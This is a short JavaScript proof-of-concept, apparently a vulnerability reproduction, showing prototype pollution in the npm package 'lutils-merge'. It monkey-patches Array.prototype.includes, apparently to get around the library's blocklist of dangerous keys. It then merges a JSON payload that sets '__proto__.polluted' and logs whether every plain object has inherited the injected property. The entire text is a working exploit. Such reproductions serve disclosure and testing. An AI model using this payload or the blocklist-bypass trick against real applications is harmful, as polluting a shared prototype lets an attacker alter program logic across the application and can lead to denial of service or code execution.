Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const merge = require('lutils-merge');
const payload = '{"__proto__":{"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
merge({}, JSON.parse(payload));
console.log({}.polluted);